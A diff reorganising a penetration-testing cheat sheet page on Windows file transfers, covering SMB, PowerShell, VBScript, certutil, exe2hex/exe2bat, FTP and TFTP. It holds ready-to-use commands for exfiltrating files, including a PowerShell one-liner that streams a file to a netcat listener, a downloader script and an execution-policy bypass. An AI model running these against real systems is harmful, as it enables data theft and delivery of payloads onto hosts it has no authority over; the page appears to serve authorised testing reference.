@@ -1,9 +1,10 @@
 ---
 layout: default
-title: File Transfers
+title: Windows
+parent: File Transfers
 ---
 
-# File Transfers
+# Windows File Transfers
 {: .no_toc }
 
 ## Table of contents
@@ -14,19 +15,16 @@ title: File Transfers
 
 ---
 
-## Linux
-
----
-
-## Windows
-### SMB
+## SMB
 Exfill files recursively
 ```powershell
 xcopy /c /h /r /s /y <source> <smb destination>
 ```
 - e.g. `C:\*`
 
-### PowerShell
+---
+
+## PowerShell
 Running PowerShell commands/files
 ```powershell
 powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command <command>
@@ -63,8 +61,9 @@ PowerShell one-liner to send file to NetCat
 $h="<host>";$p="<port>";$data=Get-Content -Path "<file>";$tcp=New-Object System.Net.Sockets.TcpClient($h,$p);$w=New-Object System.IO.StreamWriter($tcp).GetStream();foreach($l in $data){$w.WriteLine($l)};$w.Flush();$w.Close();$tcp.Close();
 ```
 
+---
 
-### VBScript
+## VBScript
 Paste into terminal to create `wget.vbs` script
 ```powershell
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -98,7 +97,9 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs <url> <output>
 ```
 
-### Convert File to Base64
+---
+
+## Convert File to Base64
 Base 64 Encoding
 ```powershell
 certutil -encode <input> <output>
@@ -111,7 +112,9 @@ certutil -decode <input> <output>
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<b64 string>")) > <UTF8 output>
 ```
 
-### exe2hex (debug.exe or PowerShell)
+---
+
+## exe2hex (debug.exe or PowerShell)
 ```shell
 python3 exe2hex.py -x <exe> [-b <bat output>] [-p <ps output>] [-cc]        # From file
 cat <exe> | python3 exe2hex.py -s [-b <bat output>] [-p <ps output>] [-cc]  # From stdin
@@ -126,7 +129,9 @@ cat <exe> | python3 exe2hex.py -s [-b <bat output>] [-p <ps output>] [-cc]  # Fr
     - Use [Expect](http://expect.sourceforge.net/); available on most distros `apt install expect`
     - Further details found here <https://github.com/g0tmi1k/exe2hex/blob/master/README.md>
 
-### exe2bat (debug.exe)
+---
+
+## exe2bat (debug.exe)
 - Only works on 32-bit systems and file must be at most 64kB
 - If > 64kB, use a compression tool such as `upx`
 ```shell
@@ -138,7 +143,9 @@ Convert .exe to series of echo commands using `exe2bat`, paste into target termi
 wine exe2bat.exe <input exe> <output text file>  # Remove Wine if on Windows
 ```
 
-### FTP
+---
+
+## FTP
 - Often enabled, but interactive so need to provide text file with FTP commands instead
 
 Setup FTP server e.g. vsftpd, pureftpd or proftpd
@@ -158,7 +165,9 @@ echo bye >> ftp.txt
 ftp -s:ftp.txt
 ```
 
-### TFTP
+---
+
+## TFTP
 - Enabled by default up to Win 2003/XP
 - UDP based, often blocked by corporate egress rules
 - Non-interactive, easy to setup
